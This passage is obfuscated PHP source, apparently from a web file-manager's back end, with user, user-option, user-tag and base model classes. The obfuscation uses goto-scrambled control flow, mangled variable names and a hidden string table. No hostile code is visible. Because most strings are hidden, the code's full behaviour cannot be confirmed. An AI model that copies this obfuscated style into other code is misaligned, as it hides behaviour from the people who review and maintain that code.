$EØá°Ñ©Œ¯ =& $_SERVER[ÍÓÖ€°å]; $fÔÂä°ä¸º = $CŠ¹ÔÀ¶»¦[$EØá°Ñ©Œ¯[1604]]; $cˆ½ÂÑÜ§Ì = isset($CŠ¹ÔÀ¶»¦[$EØá°Ñ©Œ¯[1605]]) ? $CŠ¹ÔÀ¶»¦[$EØá°Ñ©Œ¯[1605]] : !1; goto D‚È‹–Æµß; bÕŠ›‘Ğˆ: if (!$Aòáö‹·æ› || count($Aòáö‹·æ›[$EØá°Ñ©Œ¯[345]]) < 5 && Input::check($fÔÂä°ä¸º, $EØá°Ñ©Œ¯[298])) { $fšÅ–Ô¦èñ = $this->_searchFromMeta($EØá°Ñ©Œ¯[396], $fÔÂä°ä¸º, 10); $AĞ¯Ò‘Õ¼ = $this->_searchFromMeta($EØá°Ñ©Œ¯[395], $fÔÂä°ä¸º, 10); $e¿‡é“ İ† = array_merge($fšÅ–Ô¦èñ, $AĞ¯Ò‘Õ¼, $Aòáö‹·æ›[$EØá°Ñ©Œ¯[345]]); $Aòáö‹·æ›[$EØá°Ñ©Œ¯[345]] = array_unique_by_key($e¿‡é“ İ†, $EØá°Ñ©Œ¯[1062]); $Aòáö‹·æ›[$EØá°Ñ©Œ¯[342]][$EØá°Ñ©Œ¯[343]] = count($Aòáö‹·æ›[$EØá°Ñ©Œ¯[345]]); $Aòáö‹·æ›[$EØá°Ñ©Œ¯[342]][$EØá°Ñ©Œ¯[344]] = ceil($Aòáö‹·æ›[$EØá°Ñ©Œ¯[342]][$EØá°Ñ©Œ¯[343]] / $Aòáö‹·æ›[$EØá°Ñ©Œ¯[342]][$EØá°Ñ©Œ¯[340]]); } $this->_listDataApply($Aòáö‹·æ›[$EØá°Ñ©Œ¯[345]]); $this->_filterByGroup($Aòáö‹·æ›, $cˆ½ÂÑÜ§Ì); goto e°…†…àß•; f„Äˆ¨¿ÁÆ: } private function _filterByGroup(&$D±—´„×öŸ, $e”‡ÊÜÇ‰è) { $dõ¡´µãî =& $_SERVER[ÍÓÖ€°å]; if (!$e”‡ÊÜÇ‰è) { return $D±—´„×öŸ; } foreach ($D±—´„×öŸ[$dõ¡´µãî[345]] as $C¢Œ‘¤… => &$BöïçÒÍ£Ä) { $dœé£‘ô¥ = array_to_keyvalue($BöïçÒÍ£Ä[$dõ¡´µãî[1915]], $dõ¡´µãî[33], $dõ¡´µãî[1516]); if (!in_array($e”‡ÊÜÇ‰è, $dœé£‘ô¥)) { unset($D±—´„×öŸ[$dõ¡´µãî[345]][$C¢Œ‘¤…]); } } $D±—´„×öŸ[$dõ¡´µãî[345]] = array_values($D±—´„×öŸ[$dõ¡´µãî[345]]); $D±—´„×öŸ[$dõ¡´µãî[342]] = array($dõ¡´µãî[1916] => count($D±—´„×öŸ[$dõ¡´µãî[345]]), $dõ¡´µãî[1917] => $D±—´„×öŸ[$dõ¡´µãî[342]][$dõ¡´µãî[340]], $dõ¡´µãî[1918] => 1, $dõ¡´µãî[1919] => 1); } private function _filterUserList(&$FÌéÙÒâ¯ˆ) { $fÑö¼­Åãƒ =& $_SERVER[ÍÓÖ€°å]; foreach ($FÌéÙÒâ¯ˆ[$fÑö¼­Åãƒ[345]] as $f¡‡•ÁİÖ => &$Dñ¨³‰ÂÎë) { unset($Dñ¨³‰ÂÎë[$fÑö¼­Åãƒ[1562]]); } } private function _searchFromMeta($dÕÀÄîØÓ, $bƒçÀÍÍÚ™, $DÎÈÑğ­¢·) { goto dÍÚ®ˆÈ°¼; dÍÚ®ˆÈ°¼: $DÑ•³”ÛÊ¶ =& $_SERVER[ÍÓÖ€°å]; $bƒçÀÍÍÚ™ = strtolower($bƒçÀÍÍÚ™); $a®’†ˆÍöï = array($DÑ•³”ÛÊ¶[88] => $dÕÀÄîØÓ, $DÑ•³”ÛÊ¶[348] => array($DÑ•³”ÛÊ¶[511], "\x25{$bƒçÀÍÍÚ™}\45")); goto B ë‡ÀÈµÌ; BæÃ»Ê’: $fìàå‘«ˆˆ = $this->where(array($DÑ•³”ÛÊ¶[1053] => array($DÑ•³”ÛÊ¶[7], $d˜Ê¶¢¥Å)))->select(); if (!$fìàå‘«ˆˆ) { return array(); } return $fìàå‘«ˆˆ; goto bÄÎÀÑ…ê«; B ë‡ÀÈµÌ: $d˜Ê¶¢¥Å = Model($DÑ•³”ÛÊ¶[1920])->where($a®’†ˆÍöï)->limit($DÎÈÑğ­¢·)->select(); if (!$d˜Ê¶¢¥Å) { return array(); } $d˜Ê¶¢¥Å = array_to_keyvalue($d˜Ê¶¢¥Å, $DÑ•³”ÛÊ¶[33], $DÑ•³”ÛÊ¶[1062]); goto BæÃ»Ê’; bÄÎÀÑ…ê«: } private function _listDataApplyItem($cÌì—ïÅ¥¡) { $B‹ØÖ”øé = array($cÌì—ïÅ¥¡); $this->_listDataApply($B‹ØÖ”øé); return $B‹ØÖ”øé[0]; } private function _listDataApply(&$Cæ»˜¯¨Š, $eÎ²‹ĞÃîÖ = "\x67\162\157\165\160\x2c\155\x65\164\141\54\x73\157\165\x72\143\x65") { goto B¢Š¡·Ğïˆ; B¡‘‡ö Ÿ: if (in_array($B„©ĞÊÚØŒ[1921], $eÎ²‹ĞÃîÖ)) { $this->_listAppendMeta($Cæ»˜¯¨Š, $FóÕÏ«Ù‚ñ); } if (in_array($B„©ĞÊÚØŒ[949], $eÎ²‹ĞÃîÖ)) { $this->_listAppendSourceRoot($Cæ»˜¯¨Š, $FóÕÏ«Ù‚ñ); } goto FÓéßÜ; B¢Š¡·Ğïˆ: $B„©ĞÊÚØŒ =& $_SERVER[ÍÓÖ€°å]; if (!$Cæ»˜¯¨Š) { return; } array_remove_key($Cæ»˜¯¨Š, $B„©ĞÊÚØŒ[556]); goto a¶ÑŒÍË¿½; a¶ÑŒÍË¿½: $FóÕÏ«Ù‚ñ = array_to_keyvalue($Cæ»˜¯¨Š, $B„©ĞÊÚØŒ[33], $B„©ĞÊÚØŒ[1062]); $eÎ²‹ĞÃîÖ = explode($B„©ĞÊÚØŒ[47], $eÎ²‹ĞÃîÖ); if (in_array($B„©ĞÊÚØŒ[726], $eÎ²‹ĞÃîÖ)) { $this->_listAppendGroup($Cæ»˜¯¨Š, $FóÕÏ«Ù‚ñ); } goto B¡‘‡ö Ÿ; FÓéßÜ: } private function _listAppendSourceRoot(&$bßõ™ÄœÌ¡, $c©×¾ëÚÚï) { $eÕ¬ĞâŒß² =& $_SERVER[ÍÓÖ€°å]; $EÄÙ…ÌÙø = array($eÕ¬ĞâŒß²[384] => SourceModel::TYPE_USER, $eÕ¬ĞâŒß²[375] => 0, $eÕ¬ĞâŒß²[386] => array($eÕ¬ĞâŒß²[7], $c©×¾ëÚÚï)); $aÈ›´Ûˆ‘ = Model($eÕ¬ĞâŒß²[512])->field($eÕ¬ĞâŒß²[1922])->where($EÄÙ…ÌÙø)->select(); $aÈ›´Ûˆ‘ = array_to_keyvalue($aÈ›´Ûˆ‘, $eÕ¬ĞâŒß²[386]); $aÈ›´Ûˆ‘ = array_remove_key($aÈ›´Ûˆ‘, $eÕ¬ĞâŒß²[386]); foreach ($bßõ™ÄœÌ¡ as &$eÆÜå²‹¡š) { $eÆÜå²‹¡š[$eÕ¬ĞâŒß²[1618]] = $aÈ›´Ûˆ‘[$eÆÜå²‹¡š[$eÕ¬ĞâŒß²[1062]]] ? $aÈ›´Ûˆ‘[$eÆÜå²‹¡š[$eÕ¬ĞâŒß²[1062]]] : array(); } } private function _listAppendGroup(&$Eä…ß¼±Ò¢, $bİóª­ÈÌÊ) { goto CÀÎ‰ö©®È; bôçŒš·¥ : $d²”ƒ™”ß = array_to_keyvalue_group($d²”ƒ™”ß, $B‚‡¾“¸Š¿[1062]); foreach ($d²”ƒ™”ß as &$fÕ‚õ»¨Û) { $cğ–ƒ¯Â…î = array(); foreach ($fÕ‚õ»¨Û as $B™Èæ³–Ïª) { if (!$B™Èæ³–Ïª[$B‚‡¾“¸Š¿[1652]]) { continue; } $bÏÖ×¬–ëù = Model($B‚‡¾“¸Š¿[1658])->listData($B™Èæ³–Ïª[$B‚‡¾“¸Š¿[1652]]); $cğ–ƒ¯Â…î[] = array($B‚‡¾“¸Š¿[1516] => $B™Èæ³–Ïª[$B‚‡¾“¸Š¿[1516]], $B‚‡¾“¸Š¿[1925] => $eï§éùç•[$B™Èæ³–Ïª[$B‚‡¾“¸Š¿[1516]]], $B‚‡¾“¸Š¿[540] => $bÏÖ×¬–ëù); } $fÕ‚õ»¨Û = $cğ–ƒ¯Â…î; } foreach ($Eä…ß¼±Ò¢ as &$C¼”¶‚Àê¦) { $C¼”¶‚Àê¦[$B‚‡¾“¸Š¿[1915]] = array(); if (isset($d²”ƒ™”ß[$C¼”¶‚Àê¦[$B‚‡¾“¸Š¿[1062]]])) { $C¼”¶‚Àê¦[$B‚‡¾“¸Š¿[1915]] = $d²”ƒ™”ß[$C¼”¶‚Àê¦[$B‚‡¾“¸Š¿[1062]]]; } } goto açĞùÉŸù; CÀÎ‰ö©®È: $B‚‡¾“¸Š¿ =& $_SERVER[ÍÓÖ€°å]; $Eˆó¦òìÂß = array($B‚‡¾“¸Š¿[1062] => array($B‚‡¾“¸Š¿[7], $bİóª­ÈÌÊ)); $d²”ƒ™”ß = Model($B‚‡¾“¸Š¿[1600])->where($Eˆó¦òìÂß)->select(); goto Cè°Ü°Ô‰; Cè°Ü°Ô‰: $b÷Ñ—Ï÷³ = array_to_keyvalue($d²”ƒ™”ß, $B‚‡¾“¸Š¿[33], $B‚‡¾“¸Š¿[1516]); $b÷Ñ—Ï÷³ = array_remove_value(array_unique($b÷Ñ—Ï÷³), $B‚‡¾“¸Š¿[393]); if (!$b÷Ñ—Ï÷³ || !$d²”ƒ™”ß) { return; } goto aÖÛ–”¨Ê”; aÖÛ–”¨Ê”: $Eˆó¦òìÂß = array($B‚‡¾“¸Š¿[1516] => array($B‚‡¾“¸Š¿[7], $b÷Ñ—Ï÷³)); $E¯‰ÛôøíÉ = Model($B‚‡¾“¸Š¿[1923])->field($B‚‡¾“¸Š¿[1924])->where($Eˆó¦òìÂß)->select(); $eï§éùç• = array_to_keyvalue($E¯‰ÛôøíÉ, $B‚‡¾“¸Š¿[1516], $B‚‡¾“¸Š¿[28]); goto bôçŒš·¥ ; açĞùÉŸù: } private function _listAppendMeta(&$aí²İÔ¬¯½, $fğˆî×£‰) { goto eÀÃ‘éÖ¿ˆ; eÀÃ‘éÖ¿ˆ: $fÔš ÙÄ¨ƒ =& $_SERVER[ÍÓÖ€°å]; $Fá±´–Ó§° = UserJobModel::JOB_KEY; $C¨¾Ñ¿œÚí = array($fÔš ÙÄ¨ƒ[1895]); goto F„Š‹‰äÍ; F„Š‹‰äÍ: $eøÛ£µ‹Ÿ‹ = array($fÔš ÙÄ¨ƒ[1062] => array($fÔš ÙÄ¨ƒ[7], $fğˆî×£‰)); $e¬£œ¿Ï¿Ş = Model($fÔš ÙÄ¨ƒ[1892])->where($eøÛ£µ‹Ÿ‹)->select(); $e¬£œ¿Ï¿Ş = array_to_keyvalue_group($e¬£œ¿Ï¿Ş, $fÔš ÙÄ¨ƒ[1062]); goto Déï¬ƒõé¢; Déï¬ƒõé¢: foreach ($e¬£œ¿Ï¿Ş as &$b“¼¡‡Æ§ğ) { $bÄÑŠø…¬© = array(); foreach ($b“¼¡‡Æ§ğ as $a‰ŠôñŸŒµ) { if (!in_array($a‰ŠôñŸŒµ[$fÔš ÙÄ¨ƒ[88]], $C¨¾Ñ¿œÚí)) { $bÄÑŠø…¬©[$a‰ŠôñŸŒµ[$fÔš ÙÄ¨ƒ[88]]] = $a‰ŠôñŸŒµ[$fÔš ÙÄ¨ƒ[348]]; } } $b“¼¡‡Æ§ğ = $bÄÑŠø…¬©; } $C“ÚÈ–ƒ†œ = Model($fÔš ÙÄ¨ƒ[1926]); foreach ($aí²İÔ¬¯½ as &$cÌÌªê†¡–) { $cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1562]] = array(); $cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1927]] = array(); if (isset($e¬£œ¿Ï¿Ş[$cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1062]]])) { $cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1562]] = $e¬£œ¿Ï¿Ş[$cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1062]]]; } if (isset($cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1562]][$Fá±´–Ó§°])) { $cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1927]] = $C“ÚÈ–ƒ†œ->getUserJobInfo($cÌÌªê†¡–[$fÔš ÙÄ¨ƒ[1562]][$Fá±´–Ó§°]); } } goto cÂ ¸ºÄ¾ï; cÂ ¸ºÄ¾ï: } public function userSearch($fœîï‘¨ã, $B­Êèœš‰İ = "\52") { return Model($_SERVER[ÍÓÖ€°å][1452])->where($fœîï‘¨ã)->field($B­Êèœš‰İ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Aä§Áèµ‹) { return "\125\163\x65\162\x4f\x70\164\151\157\156\137{$Aä§Áèµ‹}\x5f" . USER_ID; } protected function filterWhere($AÈƒµÆØ†) { $AÈƒµÆØ†[$_SERVER[ÍÓÖ€°å][1062]] = USER_ID; return $AÈƒµÆØ†; } public function get($a”Ãˆö†Òµ = false, $E¦†Ê°¦œ = '', $D¼öİœ·Š = false) { goto D¼Â……ÇŸË; BÊÖ¨í´œØ: if (!$a”Ãˆö†Òµ) { return $BÅ­š–ÖƒÛ; } else { return $BÅ­š–ÖƒÛ[$a”Ãˆö†Òµ]; } goto AÛ‹×‰›Î; EÅİ¸„‘°Œ: global $config; $E‘ÇŒ­°É› = array($D£Á£ªÚ¼Î[33] => $D£Á£ªÚ¼Î[1928], $D£Á£ªÚ¼Î[1929] => $D£Á£ªÚ¼Î[1930]); $BÅ­š–ÖƒÛ = $config[$E‘ÇŒ­°É›[$E¦†Ê°¦œ]]; goto BÊÖ¨í´œØ; D¼Â……ÇŸË: $D£Á£ªÚ¼Î =& $_SERVER[ÍÓÖ€°å]; $d¿´é†»©¤ = parent::get($a”Ãˆö†Òµ, $E¦†Ê°¦œ, $D¼öİœ·Š); if (!is_null($d¿´é†»©¤)) { return $d¿´é†»©¤; } goto EÅİ¸„‘°Œ; AÛ‹×‰›Î: } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\164\141\x67\x4c\151\x73\x74"; public $modelType = "\125\x73\x65\x72\117\160\x74\x69\157\156"; public $field = array("\156\141\x6d\145", "\163\x74\171\154\145", "\x73\157\162\x74"); public function listData($c£²ÜĞá = false, $CŠÄ–¥å•» = "\x73\157\162\x74", $fÖ¦˜ ˆ = false) { return parent::listData($c£²ÜĞá, $CŠÄ–¥å•», $fÖ¦˜ ˆ); } public function remove($D©ë³ãÖ Ó) { return parent::remove($D©ë³ãÖ Ó); } public function add($b†—Ş“öùÑ, $E Ó»Ş¿ùç = "\x6c\x61\x62\145\154\x2d\147\x72\145\171\55\156\x6f\162\x6d\141\x6c") { $aÊİëÄ—»¥ =& $_SERVER[ÍÓÖ€°å]; if ($this->findByName($b†—Ş“öùÑ)) { return !1; } $cÀ…Ä¹†Ë = array($aÊİëÄ—»¥[378] => $b†—Ş“öùÑ, $aÊİëÄ—»¥[1931] => $E Ó»Ş¿ùç, $aÊİëÄ—»¥[1520] => $this->getSort($aÊİëÄ—»¥[238]) + 1); return parent::insert($cÀ…Ä¹†Ë); } public function update($EíÎƒï¯»¡, $bÏÎ‚¡ŸÖ) { $bšõƒç§¬ =& $_SERVER[ÍÓÖ€°å]; $F×ÌÄÌãâö = $this->listData($EíÎƒï¯»¡); $dÌ¢ã÷Øóš = $this->findByName($bÏÎ‚¡ŸÖ[$bšõƒç§¬[28]]); if (!$F×ÌÄÌãâö || $dÌ¢ã÷Øóš && $dÌ¢ã÷Øóš[$bšõƒç§¬[357]] != $F×ÌÄÌãâö[$bšõƒç§¬[357]]) { return !1; } return parent::update($EíÎƒï¯»¡, $bÏÎ‚¡ŸÖ); } public function moveTop($D¡çŠšƒĞê) { $B¾›…â½ô =& $_SERVER[ÍÓÖ€°å]; $c­°íá©¹ = parent::listData(); $dÑ«ì¿ÊÆÅ = $this->getSort($B¾›…â½ô[237]); foreach ($c­°íá©¹ as &$DëÒ¼½Ö¿„) { if ($DëÒ¼½Ö¿„[$B¾›…â½ô[357]] == $D¡çŠšƒĞê) { $DëÒ¼½Ö¿„[$B¾›…â½ô[1537]] = $dÑ«ì¿ÊÆÅ; continue; } $DëÒ¼½Ö¿„[$B¾›…â½ô[1537]] += 1; } return parent::resetData($c­°íá©¹); } public function moveBottom($cãéÅˆ“‡é) { $bæ‚½ÛŸİˆ =& $_SERVER[ÍÓÖ€°å]; $cÜº”’»Ôø = $this->getSort($bæ‚½ÛŸİˆ[238]) + 1; return parent::update($cãéÅˆ“‡é, array($bæ‚½ÛŸİˆ[1537] => $cÜº”’»Ôø)); } public function resetSort($Eæ£×Ñ¸ó) { $cé­·’¸óå =& $_SERVER[ÍÓÖ€°å]; $EùÛä´Ç = array(); for ($EÓÉÕ˜šù = 0; $EÓÉÕ˜šù < count($Eæ£×Ñ¸ó); $EÓÉÕ˜šù++) { $EùÛä´Ç[$Eæ£×Ñ¸ó[$EÓÉÕ˜šù] . $cé­·’¸óå[33]] = $EÓÉÕ˜šù + 1; } $B¼Ì¥”›½Õ = parent::listData(); foreach ($B¼Ì¥”›½Õ as &$E†ÕİÉŒ­) { $EİÛœ‘‘‘° = $EùÛä´Ç[$E†ÕİÉŒ­[$cé­·’¸óå[357]]]; $E†ÕİÉŒ­[$cé­·’¸óå[1537]] = $EİÛœ‘‘‘° ? $EİÛœ‘‘‘° : $E†ÕİÉŒ­[$cé­·’¸óå[1537]]; } return parent::resetData($B¼Ì¥”›½Õ); } private function getSort($bÖÓ°´ÏŞé) { $d¤¦Ğ•Ú‡î =& $_SERVER[ÍÓÖ€°å]; $EºØÅ« Œ¯ = parent::listData(); $D°İòÀÎ‘¨ = array_to_keyvalue($EºØÅ« Œ¯, $d¤¦Ğ•Ú‡î[33], $d¤¦Ğ•Ú‡î[1537]); if (!$D°İòÀÎ‘¨) { $D°İòÀÎ‘¨ = array(0); } $aŒŞáŠĞŸê = $bÖÓ°´ÏŞé == $d¤¦Ğ•Ú‡î[238] ? max($D°İòÀÎ‘¨) : min($D°İòÀÎ‘¨); return intval($aŒŞáŠĞŸê); } } goto dŒÆâ«Øöù; FéÓÔ³Å²: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\x72\164\54\x75\x70\x64\141\x74\145", "\x66\165\x6e\x63\164\151\x6f\156"), array("\x63\162\145\x61\x74\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\165\156\x63\164\151\x6f\156")); public function setDataAuto($fÑ®­ÒãÒ) { $this->dataAuto = $fÑ®­ÒãÒ; } public function __construct($aéùßó¤®‰ = '', $cŠíä»ÓÛ = '', $EŸæõíï = '') { parent::__construct($aéùßó¤®‰, $cŠíä»ÓÛ, $EŸæõíï); } static function textEncode($AÔ¢¡£Á…) { $c’š…âÊÒ =& $_SERVER[ÍÓÖ€°å]; if (!$AÔ¢¡£Á…) { return $c’š…âÊÒ[33]; } $BÇ¢ºÂíˆå = json_encode($AÔ¢¡£Á…); $BÇ¢ºÂíˆå = preg_replace_callback($c’š…âÊÒ[333], function ($Aù¶ƒ´Èô ) { return addslashes($Aù¶ƒ´Èô [0]); }, $BÇ¢ºÂíˆå); return json_decode($BÇ¢ºÂíˆå); } static function textDecode($eÒœ»ÀÑÓÇ) { $d”ÁÛÈÉ‘¢ =& $_SERVER[ÍÓÖ€°å]; $BšâˆÌ¦İ = json_encode($eÒœ»ÀÑÓÇ); $BšâˆÌ¦İ = preg_replace_callback($d”ÁÛÈÉ‘¢[334], function ($F§¨­¼¢) { return $_SERVER[ÍÓÖ€°å][92]; }, $BšâˆÌ¦İ); return json_decode($BšâˆÌ¦İ); } protected $tableMeta = array(); protected function _beforeInsert(&$f‘Î—ÆœŞœ, $cš¢ƒñå»Ò) { $D¦¹ÕŒİÉ‡ =& $_SERVER[ÍÓÖ€°å]; if (!$this->checkDataAutoHas($D¦¹ÕŒİÉ‡[335])) { return; } $this->dataBeforeFilter($f‘Î—ÆœŞœ, $D¦¹ÕŒİÉ‡[335]); } protected function _beforeUpdate(&$F…†âÔõó, $e·´êÛÏ¤‰) { $DèÙœÔÔ =& $_SERVER[ÍÓÖ€°å]; if (!$this->checkDataAutoHas($DèÙœÔÔ[336])) { return; } $this->dataBeforeFilter($F…†âÔõó, $DèÙœÔÔ[336]); } protected function _afterSelect(&$F©·¿Ç›ç, $eƒÌ×ÄàÇ) { if (!is_array($F©·¿Ç›ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÍÓÖ€°å][337])) { return; } foreach ($F©·¿Ç›ç as &$e˜ë£Ë‘»ò) { $this->dataAfterFilter($e˜ë£Ë‘»ò); } } protected function _afterFind(&$DÏÄŞÔ¡“í, $bœààäÊ¡®) { if (!is_array($DÏÄŞÔ¡“í)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÍÓÖ€°å][337])) { return; } $this->dataAfterFilter($DÏÄŞÔ¡“í); } public function setAutoIncrement($fßÈŠŸ„‡§) { $f‘°Üèòìà = array($this->getPk() => $fßÈŠŸ„‡§); $d´õ‹·ğâŠ = $this->data($f‘°Üèòìà)->add(); if ($d´õ‹·ğâŠ) { $this->delete($d´õ‹·ğâŠ); } } public function getAutoIncrement() { $C†íƒ¼„ó† = $this->getTableName(); $c‚šè¯ÍÕÉ = $this->max($this->getPk()); $DĞ¿¤¸ˆ’ = $this->query("\x73\150\157\167\x20\164\141\142\154\145\40\163\x74\141\164\165\163\x20\x77\150\x65\162\x65\x20\116\141\155\145\x3d\x27{$C†íƒ¼„ó†}\47"); $a˜¸ÀÇ¼Ô = $DĞ¿¤¸ˆ’[0][$_SERVER[ÍÓÖ€°å][338]]; $C¬ùßõ„‰‹ = max($c‚šè¯ÍÕÉ, $a˜¸ÀÇ¼Ô); return $C¬ùßõ„‰‹; } protected function _callBefore($F»ì­åà¿, $bæÌ­œçàÍ) { return $this->cacheCallCheck($F»ì­åà¿, $bæÌ­œçàÍ, !1); } protected function _callAfter($Aç÷ŠêìİÆ, $fí•–ôš®’) { return $this->cacheCallCheck($Aç÷ŠêìİÆ, $fí•–ôš®’, !0); } protected function cacheFunctionAlias($f™ƒÀ†ö’) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aŒŒÊœŒ­½, $cµâ¾Ÿ¥Âå, $F†¤‚Ï™¡ = false) { $Däíœ£¢·´ = $this->cacheFunctionAlias($cµâ¾Ÿ¥Âå); if (!$Däíœ£¢·´) { return; } foreach ($Däíœ£¢·´ as $bÒ¬ ‚áë => $F…™ë¬Îß) { $c¦ö„Ü•®º = $F…™ë¬Îß[0]; $då“¥òˆËØ = explode($_SERVER[ÍÓÖ€°å][47], $F…™ë¬Îß[1]); if ($aŒŒÊœŒ­½ == $bÒ¬ ‚áë) { return $this->cacheFunctionGet($bÒ¬ ‚áë, $c¦ö„Ü•®º); } if ($F†¤‚Ï™¡ && in_array($aŒŒÊœŒ­½, $då“¥òˆËØ)) { $this->cacheFunctionClear($bÒ¬ ‚áë, $c¦ö„Ü•®º); } } } public function cacheFunctionGet($a±‹çº…Ó, $bù‚‘ˆšëÃ) { $EÉòÇ¢ÖŠë = $this->cacheKeyMake($a±‹çº…Ó, $bù‚‘ˆšëÃ); $b¾²ñå¨Í¥ = Cache::get($EÉòÇ¢ÖŠë); if (!is_array($b¾²ñå¨Í¥)) { $b¾²ñå¨Í¥ = call_user_func_array(array($this, $a±‹çº…Ó), array($bù‚‘ˆšëÃ, !0)); Cache::set($EÉòÇ¢ÖŠë, $b¾²ñå¨Í¥); } return $b¾²ñå¨Í¥; } public function cacheFunctionClear($DóÂ‘Ë—œ±, $aÑ»¾á–²‰) { $FŞ¯Úë‘ã½ = $aÑ»¾á–²‰; if (!is_array($aÑ»¾á–²‰)) { $FŞ¯Úë‘ã½ = array($aÑ»¾á–²‰); } foreach ($FŞ¯Úë‘ã½ as $CçøÓ‡ºå) { $e¨×áŞ¹Û© = $this->cacheKeyMake($DóÂ‘Ë—œ±, $CçøÓ‡ºå); Cache::remove($e¨×áŞ¹Û©); } } private function cacheKeyMake($f°—ãÁÁå¥, $A«íÈ…—) { $Bºçİ«Íö =& $_SERVER[ÍÓÖ€°å]; return get_class($this) . $Bºçİ«Íö[71] . $f°—ãÁÁå¥ . $Bºçİ«Íö[339] . $A«íÈ…—; } protected function selectPage($F¹Öƒ÷–·Î = 200, $D»Ş‘œƒÓ = 1) { goto A¢ îæ–ë; cŠ‚ÒìêËŸ: $A§íÀÆô‘× = $this->page($D»Ş‘œƒÓ, $F¹Öƒ÷–·Î)->select(); if ($D×‹³Ä¡˜ == 1) { $cÙÕó¾â·‡ = count($A§íÀÆô‘×); } $fÒÚÑëŞù = array($dô¶ŞÀù†[342] => array($dô¶ŞÀù†[343] => $cÙÕó¾â·‡, $dô¶ŞÀù†[340] => $F¹Öƒ÷–·Î, $dô¶ŞÀù†[331] => $D»Ş‘œƒÓ, $dô¶ŞÀù†[344] => $D×‹³Ä¡˜), $dô¶ŞÀù†[345] => $A§íÀÆô‘× ? $A§íÀÆô‘× : array()); goto e£Ó‡Ê÷Å; A¢ îæ–ë: $dô¶ŞÀù† =& $_SERVER[ÍÓÖ€°å]; global $in; $c¥µƒŞ¸áº = $this->optionsValue(); goto eÒÍƒ‰¨¸¶; EšæØƒöà: $F¹Öƒ÷–·Î = intval(isset($in[$dô¶ŞÀù†[340]]) ? $in[$dô¶ŞÀù†[340]] : $F¹Öƒ÷–·Î); $F¹Öƒ÷–·Î = $F¹Öƒ÷–·Î <= 5 ? 5 : ($F¹Öƒ÷–·Î >= $c–ØİÂĞåî ? $c–ØİÂĞåî : $F¹Öƒ÷–·Î); $D×‹³Ä¡˜ = ceil($cÙÕó¾â·‡ / $F¹Öƒ÷–·Î); goto CŞ®™Ë½´Å; e£Ó‡Ê÷Å: return $fÒÚÑëŞù; goto fŞñåéÔâ; CŞ®™Ë½´Å: $D»Ş‘œƒÓ = intval(isset($in[$dô¶ŞÀù†[331]]) ? $in[$dô¶ŞÀù†[331]] : $D»Ş‘œƒÓ); $D»Ş‘œƒÓ = $D»Ş‘œƒÓ <= 1 ? 1 : ($D»Ş‘œƒÓ >= $D×‹³Ä¡˜ ? $D×‹³Ä¡˜ : $D»Ş‘œƒÓ); $this->optionsValue($c¥µƒŞ¸áº); goto cŠ‚ÒìêËŸ; c…±µ¬õÃÃ: $A¡¥¡œªèƒ[$dô¶ŞÀù†[341]] = array(); $this->optionsValue($A¡¥¡œªèƒ); $cÙÕó¾â·‡ = intval($this->count()); goto EšæØƒöà; eÒÍƒ‰¨¸¶: $c–ØİÂĞåî = 4000; if ($F¹Öƒ÷–·Î === -1) { unset($in[$dô¶ŞÀù†[340]]); $c–ØİÂĞåî = 100000000; $F¹Öƒ÷–·Î = $c–ØİÂĞåî; } $A¡¥¡œªèƒ = $c¥µƒŞ¸áº; goto c…±µ¬õÃÃ; fŞñåéÔâ: } protected function metaSet($f™Êá—Óä, $cÀÛÆÂğì = null, $c´ÂŸ‰œå— = null) { goto AĞ“§÷–Ÿª; C›»Ê‡ç´: $EàœÒŒñ­Ï = Model($this->tableMeta[$Dëó‚›¾ÑÂ[347]]); if (is_array($cÀÛÆÂğì)) { $d†ßŞ²·İì = array(); foreach ($cÀÛÆÂğì as $DéôÒ‰é‰‚ => $DŞ¹Œ) { $d†ßŞ²·İì[] = array($d®Èâ„Ö => $f™Êá—Óä, $Dëó‚›¾ÑÂ[88] => $DéôÒ‰é‰‚, $Dëó‚›¾ÑÂ[348] => $DŞ¹Œ); } $EàœÒŒñ­Ï->where(array($d®Èâ„Ö => $f™Êá—Óä))->addAll($d†ßŞ²·İì, array(), !0); return !0; } $AƒÜ„ˆÒË = array($d®Èâ„Ö => $f™Êá—Óä, $Dëó‚›¾ÑÂ[349] => $cÀÛÆÂğì); goto fÙ¥ê¿ëÛ±; AĞ“§÷–Ÿª: $Dëó‚›¾ÑÂ =& $_SERVER[ÍÓÖ€°å]; if (!$this->tableMeta) { return !1; } $d®Èâ„Ö = $this->tableMeta[$Dëó‚›¾ÑÂ[346]]; goto C›»Ê‡ç´; EÜàÚ‹Æ‚â: if ($EàœÒŒñ­Ï->where($AƒÜ„ˆÒË)->find()) { $fâ†µÖÕ = $EàœÒŒñ­Ï->where($AƒÜ„ˆÒË)->save(array($Dëó‚›¾ÑÂ[350] => $c´ÂŸ‰œå—)); } else { $AƒÜ„ˆÒË[$Dëó‚›¾ÑÂ[348]] = $c´ÂŸ‰œå—; $fâ†µÖÕ = $EàœÒŒñ­Ï->add($AƒÜ„ˆÒË); } return $fâ†µÖÕ; goto d×´Äë•Ã; fÙ¥ê¿ëÛ±: if (is_null($cÀÛÆÂğì)) { return $EàœÒŒñ­Ï->where(array($d®Èâ„Ö => $f™Êá—Óä))->delete(); } if (is_null($c´ÂŸ‰œå—)) { return $EàœÒŒñ­Ï->where($AƒÜ„ˆÒË)->delete(); } $fâ†µÖÕ = !1; goto EÜàÚ‹Æ‚â; d×´Äë•Ã: } public function metaGet($FŒ¥ŞÕÇç¯) { goto e«ì¾¹Ú÷; 